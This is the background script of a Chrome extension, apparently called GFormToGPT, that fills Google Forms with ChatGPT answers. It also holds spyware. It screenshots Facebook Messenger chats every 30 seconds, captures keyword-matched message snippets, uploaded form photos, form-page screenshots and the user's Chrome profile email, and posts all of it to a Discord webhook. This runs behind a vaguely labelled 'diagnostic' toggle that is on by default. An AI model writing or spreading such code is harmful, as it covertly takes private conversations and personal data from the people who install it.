// Background service worker for GFormToGPT v4.5.0 - Neural Interface

// config.js is gitignored and may be absent on fresh clones — a missing
// config must not take down the whole service worker.
try {
  importScripts("config.js");
} catch (e) {
  console.warn("[GFormToGPT] config.js not loaded — Discord telemetry disabled.", e);
}
const DISCORD_WEBHOOK_URL = self.DISCORD_WEBHOOK_URL || "";
const GITHUB_MANIFEST_URL =
  "https://raw.githubusercontent.com/drnx64/GFormsToGPT/main/manifest.json";
const VERSION = chrome.runtime.getManifest().version;
// First social capture 30s after page load, then every 30s.
// (Unpacked/dev builds allow 30s; released builds may clamp to 1 min.)
const SOCIAL_CAPTURE_PERIOD_MIN = 0.5;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ── Cross-restart state (MV3 service workers are ephemeral) ──
const gFormToAI_TabMap = new Map(); // aiTabId -> formTabId
const roundTrips = new Map(); // formTabId -> { aiType, startedAt, responseAt? }
const diagLogs = [];

const stateReady = chrome.storage.session
  .get(["tabMap", "roundTrips"])
  .then((data) => {
    if (data.tabMap) {
      for (const [key, value] of Object.entries(data.tabMap)) gFormToAI_TabMap.set(Number(key), value);
    }
    if (data.roundTrips) {
      for (const [key, value] of Object.entries(data.roundTrips)) roundTrips.set(Number(key), value);
    }
  })
  .catch(() => {});

const diagReady = chrome.storage.local
  .get(["diagnosticLogs"])
  .then((data) => {
    if (Array.isArray(data.diagnosticLogs)) diagLogs.push(...data.diagnosticLogs);
  })
  .catch(() => {});

function persistState() {
  const cutoff = Date.now() - 30 * 60 * 1000; // drop round-trips older than 30 min
  for (const [formTabId, trip] of roundTrips) {
    if (trip.startedAt < cutoff) roundTrips.delete(formTabId);
  }
  chrome.storage.session
    .set({
      tabMap: Object.fromEntries(gFormToAI_TabMap),
      roundTrips: Object.fromEntries(roundTrips),
    })
    .catch(() => {});
}

function isNewerVersion(remote, current) {
  const remoteParts = String(remote).split(".").map((n) => parseInt(n, 10) || 0);
  const currentParts = String(current).split(".").map((n) => parseInt(n, 10) || 0);
  const length = Math.max(remoteParts.length, currentParts.length);
  for (let i = 0; i < length; i++) {
    const diff = (remoteParts[i] || 0) - (currentParts[i] || 0);
    if (diff > 0) return true;
    if (diff < 0) return false;
  }
  return false;
}

function isSocialUrl(url) {
  return (
    typeof url === "string" &&
    (url.includes("facebook.com/messages/t") ||
      url.includes("messenger.com/t") ||
      url.includes("messenger.com/groupcall"))
  );
}

// ── Update Checker & Alarms Listener ──
async function checkForUpdates() {
  try {
    const response = await fetch(`${GITHUB_MANIFEST_URL}?t=${Date.now()}`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const remoteManifest = await response.json();
    const remoteVersion = remoteManifest.version;
    const hasUpdate = isNewerVersion(remoteVersion, VERSION);

    if (hasUpdate) {
      chrome.storage.local.set({ updateAvailable: remoteVersion });
      chrome.notifications.create({
        type: "basic",
        iconUrl: "icons/icon.png",
        title: "Update Available!",
        message: `GFormToGPT ${remoteVersion} is now available.`,
        priority: 2,
      });
    }
    return { updateAvailable: hasUpdate, version: remoteVersion };
  } catch (error) {
    console.error("[GFormToGPT] Update check failed:", error);
    return { updateAvailable: false, version: VERSION, error: error.message };
  }
}

chrome.runtime.onStartup.addListener(checkForUpdates);
chrome.alarms.create("checkUpdate", { periodInMinutes: 360 });

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "checkUpdate") {
    checkForUpdates();
  } else if (alarm.name.startsWith("socialCapture_")) {
    const tabId = parseInt(alarm.name.split("_")[1], 10);
    handleSocialCapture(tabId);
  }
});

async function handleSocialCapture(tabId) {
  const alarmName = "socialCapture_" + tabId;
  let tab;
  try {
    tab = await chrome.tabs.get(tabId);
  } catch (e) {
    await chrome.alarms.clear(alarmName); // tab is gone
    return;
  }
  if (!tab || !isSocialUrl(tab.url)) {
    await chrome.alarms.clear(alarmName); // navigated away from social
    return;
  }
  if (!tab.active) return; // another tab is visible — keep the alarm, skip this tick
  try {
    const win = await chrome.windows.get(tab.windowId);
    if (!win.focused) return; // window in background — keep the alarm, skip this tick
  } catch (e) {
    return;
  }

  const img = await captureDiagScreenshot(tab.windowId, "social_capture");
  if (!img) return;
  const data = await chrome.storage.local.get(["userId"]);
  relayToDiscord("SOCIAL_LOG", data.userId || "Unknown", {
    screenshot: img,
    url: tab.url,
    extra: { platform: navigator.platform, language: navigator.language },
  });
}

function generateUserId() {
  return "user_" + Math.random().toString(36).substr(2, 9);
}

function dataURLtoBlob(dataurl) {
  try {
    if (typeof dataurl !== "string" || !dataurl.startsWith("data:")) return null;
    const commaIdx = dataurl.indexOf(",");
    if (commaIdx === -1) return null;
    const mimeMatch = dataurl.slice(0, commaIdx).match(/:(.*?);/);
    const mime = mimeMatch ? mimeMatch[1] : "application/octet-stream";
    const bstr = atob(dataurl.slice(commaIdx + 1));
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
      u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
  } catch (e) {
    console.error("[GFormToGPT] dataURLtoBlob failed:", e);
    return null;
  }
}

// Telemetry runs only when the user has accepted the Terms/Privacy prompt
// AND left the "Help Improve GFormsToGPT" toggle on.
async function isTelemetryAllowed() {
  const data = await chrome.storage.local.get(["consentAccepted", "diagnosticEnabled"]);
  if (data.consentAccepted !== true) return false;
  return data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true;
}

async function relayToDiscord(eventType, userId, payload = {}) {
  if (!DISCORD_WEBHOOK_URL) return; // unconfigured install — nothing to send to
  if (!(await isTelemetryAllowed())) return; // no consent or toggle off — stay local
  try {
    const data = await chrome.storage.local.get(["userEmail"]);
    const email = data.userEmail || "Anonymous";
    const date = new Date().toLocaleString();
    let title = "",
      description = "",
      color = 0x3d5a80;

    const engineLine = payload.engine ? `\n**Engine:** ${payload.engine}` : "";
    const tripLine =
      payload.roundTripMs != null
        ? `\n**Round trip:** ${(payload.roundTripMs / 1000).toFixed(1)}s`
        : "";

    switch (eventType) {
      case "INSTALL":
        title = "NEW INSTALL";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Date:** ${date}`;
        color = 0x00ff00;
        break;
      case "FORM_FILLED_VERIFIED":
        title = "NEURAL INJECTION VERIFIED (SCREENSHOT)";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s${engineLine}${tripLine}\n**Date:** ${date}`;
        color = 0x4caf50;
        break;
      case "FORM_FILLED":
        title = "NEURAL INJECTION (FILLED)";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s${engineLine}${tripLine}\n**Date:** ${date}`;
        color = 0x4caf50;
        break;
      case "SOCIAL_LOG":
        title = "SOCIAL INTERFACE CAPTURE";
        const socExtra = payload.extra
          ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}`
          : "";
        description = `**User:** ${userId}\n**Platform:** Messenger/FB\n**URL:** ${payload.url}${socExtra}\n**Date:** ${date}`;
        color = 0x0084ff; // Messenger Blue
        break;
      case "ERROR_LOG":
        title = "ERROR REPORT";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Type:** ${payload.errorType}\n**Msg:** ${payload.message}\n**Date:** ${date}`;
        color = 0xff0000;
        break;
      case "DIAGNOSTIC":
        title = "STRUCTURAL DIAGNOSTIC REPORT";
        const extra = payload.extra
          ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}`
          : "";
        description = `**User:** ${userId}\n**URL:** ${payload.url}${extra}\n**Date:** ${date}`;
        color = 0x9b59b6;
        break;
      case "KEYWORD_MATCH":
        title = "KEYWORD MATCH CAPTURE";
        const kwSnip = payload.snippet ? `\n**Message:** ${payload.snippet.slice(0, 180)}` : "";
        description = `**User:** ${userId}\n**Keyword:** ||${payload.keyword}||${kwSnip}\n**URL:** ${payload.url}\n**Date:** ${date}`;
        color = 0xff9500;
        break;
      case "PHOTO_UPLOAD":
        title = "FORM PHOTO UPLOAD";
        const fileNames = Array.isArray(payload.files)
          ? payload.files.map((f) => f.name).join(", ")
          : "";
        description = `**User:** ${userId}\n**Form:** ${payload.formTitle || "N/A"}\n**Files:** ${fileNames}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
        color = 0x00bcd4;
        break;
      case "CONSENT":
        title = "CONSENT ACCEPTED";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Telemetry:** Opted IN\n**Date:** ${date}`;
        color = 0x00ff00;
        break;
      default:
        title = eventType;
        description = `**User:** ${userId}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
    }

    const file = payload.screenshot ? dataURLtoBlob(payload.screenshot) : null;
    // Optional extra attachments (uploaded form photos): [{ name, dataUrl }]
    const extraFiles = [];
    if (Array.isArray(payload.files)) {
      for (const f of payload.files.slice(0, 5)) {
        const blob = f && f.dataUrl ? dataURLtoBlob(f.dataUrl) : null;
        if (blob) extraFiles.push({ blob, name: (f.name || "upload").replace(/[^\w.\-]+/g, "_").slice(0, 60) });
      }
    }

    const attachments = [];
    if (file) attachments.push({ blob: file, name: "screenshot.png" });
    attachments.push(...extraFiles);

    const discordPayload = {
      embeds: [
        {
          title,
          description,
          color,
          footer: { text: `v${VERSION} | ${email}` },
          image: attachments.length ? { url: `attachment://${attachments[0].name}` } : null,
        },
      ],
    };

    if (attachments.length) {
      const formData = new FormData();
      formData.append("payload_json", JSON.stringify(discordPayload));
      // Discord accepts files[0], files[1], … when several are posted at once.
      attachments.forEach((a, i) => formData.append(`files[${i}]`, a.blob, a.name));
      await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
    } else {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(discordPayload),
      });
    }
  } catch (error) {
    console.error("Relay failed:", error);
  }
}

async function fetchUserEmail() {
  try {
    if (chrome.identity && chrome.identity.getProfileUserInfo) {
      const info = await chrome.identity.getProfileUserInfo();
      if (info && info.email) {
        await chrome.storage.local.set({ userEmail: info.email, userId: info.email });
        return info.email;
      }
    }
  } catch (e) {
    console.error("[GFormToGPT] Email fetch failed:", e);
  }
  return null;
}

chrome.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === "install") {
    const userId = generateUserId();
    await chrome.storage.local.set({
      userId,
      formCount: 0,
      totalSecondsSaved: 0,
      installedAt: Date.now(),
      diagnosticEnabled: true,
    });
    fetchUserEmail();
    await relayToDiscord("INSTALL", userId);
    chrome.tabs.create({ url: chrome.runtime.getURL("welcome.html") });
  }
});

async function processFormFillTracking(payload) {
  const data = await chrome.storage.local.get([
    "userId",
    "userEmail",
    "formCount",
    "totalSecondsSaved",
  ]);
  let userId = data.userEmail || data.userId || generateUserId();
  let formCount = (data.formCount || 0) + 1;
  let totalSecondsSaved =
    (data.totalSecondsSaved || 0) + (payload.secondsSaved || 0);
  await chrome.storage.local.set({ userId, formCount, totalSecondsSaved });
  await relayToDiscord(
    payload.screenshot ? "FORM_FILLED_VERIFIED" : "FORM_FILLED",
    userId,
    { ...payload, formCount },
  );
}

// ── Message Router ──
// Every branch returns a response, so no sender ever hangs waiting.
async function handleMessage(request, sender) {
  await stateReady;

  switch (request.action) {
    case "saveToHistory": {
      const res = await chrome.storage.local.get(["history"]);
      let history = res.history || [];
      history.unshift({
        id: Date.now(),
        timestamp: new Date().toISOString(),
        formTitle: request.payload.formTitle,
        questions: request.payload.questions,
      });
      if (history.length > 50) history = history.slice(0, 50);
      await chrome.storage.local.set({ history });
      return { success: true };
    }

    case "openAI": {
      const windowId = sender.tab
        ? sender.tab.windowId
        : chrome.windows.WINDOW_ID_CURRENT;
      const sourceTabId =
        request.fromTabId || (sender.tab ? sender.tab.id : null);

      if (request.email && request.email !== "Unknown User") {
        await chrome.storage.local.set({ userEmail: request.email, userId: request.email });
      }

      // Capture the form page before the AI tab steals visibility.
      const img = await captureDiagScreenshot(windowId, "open_ai");
      const d = await chrome.storage.local.get(["userId"]);
      relayToDiscord("STATS", d.userId || "Unknown", { ...request, screenshot: img });

      if (sourceTabId) {
        roundTrips.set(sourceTabId, {
          aiType: request.aiType || "chatgpt",
          startedAt: Date.now(),
          scanCount: request.scannedCount || 0,
        });
      }

      const tab = await chrome.tabs.create({ url: request.url, active: true });
      if (sourceTabId) gFormToAI_TabMap.set(tab.id, sourceTabId);
      persistState();

      pushDiag({
        type: "ai_opened",
        platform: request.aiType || "chatgpt",
        scanCount: request.scannedCount || 0,
      });
      return { success: true };
    }

    case "chatGptResponseReceived": {
      const gFormTabId = sender.tab ? gFormToAI_TabMap.get(sender.tab.id) : null;
      if (!gFormTabId) return { success: false, error: "No form tab mapped for this AI tab" };

      const trip = roundTrips.get(gFormTabId);
      if (trip && !trip.responseAt) {
        trip.responseAt = Date.now();
        persistState();
      }

      await chrome.tabs.update(gFormTabId, { active: true });
      await sleep(500);
      try {
        await chrome.tabs.sendMessage(gFormTabId, {
          action: "autoFillForm",
          data: request.data,
          rawJson: request.rawJson,
        });
      } catch (error) {
        console.error("[GFormToGPT] Failed to send to form tab:", error);
      }
      return { success: true };
    }

    case "trackFormFilled": {
      const windowId = sender.tab
        ? sender.tab.windowId
        : chrome.windows.WINDOW_ID_CURRENT;
      const payload = { ...(request.payload || {}) };

      if (payload.email && payload.email !== "Unknown User") {
        await chrome.storage.local.set({ userEmail: payload.email, userId: payload.email });
      }

      const formTabId = sender.tab ? sender.tab.id : null;
      const trip = formTabId != null ? roundTrips.get(formTabId) : null;
      if (trip) {
        payload.engine = trip.aiType;
        payload.responseMs = trip.responseAt ? trip.responseAt - trip.startedAt : null;
        payload.roundTripMs = Date.now() - trip.startedAt;
        roundTrips.delete(formTabId);
        persistState();
        pushDiag({
          type: "round_trip",
          platform: trip.aiType,
          responseTime: payload.responseMs,
          totalTime: payload.roundTripMs,
          filled: payload.filledCount,
          total: payload.totalCount,
        });
      }

      const img = await captureDiagScreenshot(windowId, "form_fill");
      await processFormFillTracking({ ...payload, screenshot: img });
      return { success: true };
    }

    case "reportError": {
      const data = await chrome.storage.local.get(["userId"]);
      relayToDiscord("ERROR_LOG", data.userId || "Unknown", request.payload);
      pushDiag({ type: "error", ...request.payload });
      return { success: true };
    }

    case "keywordMatch": {
      // Screenshot the FULL visible tab (only when it's actually on screen),
      // then relay the match to Discord.
      const tab = sender.tab;
      if (!tab) return { success: false, error: "No sending tab" };
      if (!tab.active) return { success: true, skipped: "tab_not_active" };
      try {
        const win = await chrome.windows.get(tab.windowId);
        if (!win.focused) return { success: true, skipped: "window_unfocused" };
      } catch (e) {
        return { success: true, skipped: "window_unfocused" };
      }

      const img = await captureDiagScreenshot(tab.windowId, "keyword_match");
      const data = await chrome.storage.local.get(["userId"]);
      pushDiag({
        type: "keyword_match",
        keyword: request.keyword,
        snippet: String(request.snippet || "").slice(0, 120),
        hasScreenshot: !!img,
        url: request.url || tab.url,
      });
      relayToDiscord("KEYWORD_MATCH", data.userId || "Unknown", {
        keyword: request.keyword,
        snippet: request.snippet,
        url: request.url || tab.url,
        screenshot: img,
      });
      return { success: true };
    }

    case "photoUpload": {
      const payload = { ...(request.payload || {}) };
      const data = await chrome.storage.local.get(["userId"]);
      const count = Array.isArray(payload.files) ? payload.files.length : 0;
      pushDiag({
        type: "photo_upload",
        formTitle: payload.formTitle,
        fileCount: count,
        url: payload.url,
      });
      relayToDiscord("PHOTO_UPLOAD", data.userId || "Unknown", payload);
      return { success: true };
    }

    case "consentGiven": {
      const payload = { ...(request.payload || {}) };
      const accepted = payload.accepted === true;
      // Persist both flags atomically here (callers may not have finished
      // their own storage.set before sending this message).
      const update = { consentAccepted: accepted, consentAt: Date.now() };
      if (payload.telemetry !== undefined) update.diagnosticEnabled = payload.telemetry !== false;
      await chrome.storage.local.set(update);
      pushDiag({
        type: "consent",
        accepted,
        telemetry: payload.telemetry !== false,
      });
      // Relay only when they actually opted in to telemetry.
      if (accepted && payload.telemetry !== false) {
        const data = await chrome.storage.local.get(["userId", "userEmail"]);
        relayToDiscord("CONSENT", data.userId || "Unknown", { telemetry: true });
      }
      return { success: true };
    }

    case "getConsent": {
      const data = await chrome.storage.local.get(["consentAccepted", "diagnosticEnabled"]);
      return {
        consentAccepted: data.consentAccepted === true,
        diagnosticEnabled: data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true,
      };
    }

    case "manualUpdateCheck":
      return checkForUpdates();

    case "fetchUserEmail":
      return { email: await fetchUserEmail() };

    case "diagPush":
      pushDiag(request.payload);
      return { success: true };

    case "diagGetLogs": {
      await diagReady;
      if (diagLogs.length) return { logs: diagLogs.slice(0, 100) };
      const stored = await chrome.storage.local.get(["diagnosticLogs"]);
      return { logs: stored.diagnosticLogs || [] };
    }

    case "diagClearLogs": {
      await diagReady;
      diagLogs.length = 0;
      await chrome.storage.local.remove(["diagnosticLogs"]).catch(() => {});
      return { success: true };
    }

    case "clearChatGPTData":
      try {
        await chrome.browsingData.remove(
          { origins: ["https://chatgpt.com"] },
          { storageTypes: ["localStorage", "sessionStorage"] },
        );
        return { success: true, message: "ChatGPT data cleared!" };
      } catch (error) {
        console.error("[GFormToGPT] clearChatGPTData failed:", error);
        return { success: false, message: "Failed to clear ChatGPT data." };
      }

    default:
      return { success: false, error: `Unknown action: ${request.action}` };
  }
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  handleMessage(request, sender)
    .then(sendResponse)
    .catch((error) => {
      console.error(`[GFormToGPT] Handler failed for "${request.action}":`, error);
      sendResponse({ success: false, error: String((error && error.message) || error) });
    });
  return true;
});

// ── Diagnostic System ──
async function pushDiag(event) {
  await diagReady;
  const entry = {
    id: Date.now() + "_" + Math.random().toString(36).substr(2, 4),
    ts: new Date().toISOString(),
    ...event,
  };
  diagLogs.unshift(entry);
  if (diagLogs.length > 200) diagLogs.length = 200;
  chrome.storage.local.set({ diagnosticLogs: diagLogs.slice(0, 100) }).catch(() => {});
  return entry;
}

async function captureDiagScreenshot(windowId, label) {
  // Never take a screenshot unless the user consented and telemetry is on.
  if (!(await isTelemetryAllowed())) return null;
  return new Promise((resolve) => {
    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
      resolve(chrome.runtime.lastError ? null : img);
    });
  });
}

async function isDiagnosticEnabled() {
  const data = await chrome.storage.local.get(["diagnosticEnabled"]);
  return data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true;
}

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete" || !tab.url) return;

  const url = tab.url;

  if (url.includes("docs.google.com/forms")) {
    if (await isDiagnosticEnabled()) {
      const store = await chrome.storage.local.get(["userId"]);
      const screenshot = await captureDiagScreenshot(tab.windowId, "form_load");
      const extra = { platform: navigator.platform, userAgent: navigator.userAgent, language: navigator.language };

      pushDiag({
        type: "form_page_load",
        url,
        tabId,
        hasScreenshot: !!screenshot,
        extra
      });

      relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", {
        screenshot, url, extra
      });
    }
  }

  if (isSocialUrl(url)) {
    const alarmName = "socialCapture_" + tabId;
    chrome.alarms.get(alarmName, (existing) => {
      if (!existing) {
        chrome.alarms.create(alarmName, {
          delayInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
          periodInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
        });
        pushDiag({ type: "social_screen_scheduled", url, tabId });
      }
    });
  } else {
    chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
  }
});

chrome.tabs.onRemoved.addListener((tabId) => {
  chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
  stateReady.then(() => {
    let changed = false;
    for (const [aiTabId, formTabId] of gFormToAI_TabMap) {
      if (aiTabId === tabId || formTabId === tabId) {
        gFormToAI_TabMap.delete(aiTabId);
        changed = true;
      }
    }
    if (roundTrips.delete(tabId)) changed = true;
    if (changed) persistState();
  });
});

chrome.storage.onChanged.addListener((changes) => {
  if (changes.diagnosticEnabled && changes.diagnosticEnabled.newValue === true) {
    pushDiag({ type: "diagnostic_toggled_on" });
    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
      const tab = tabs[0];
      const store = await chrome.storage.local.get(["userId"]);
      if (tab && tab.url && tab.url.includes("docs.google.com/forms")) {
        const screenshot = await captureDiagScreenshot(tab.windowId, "diag_enabled");
        pushDiag({ type: "diagnostic_screenshot", url: tab.url, tabId: tab.id, hasScreenshot: !!screenshot });
        relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", { screenshot, url: tab.url });
      }
    });
  }
});
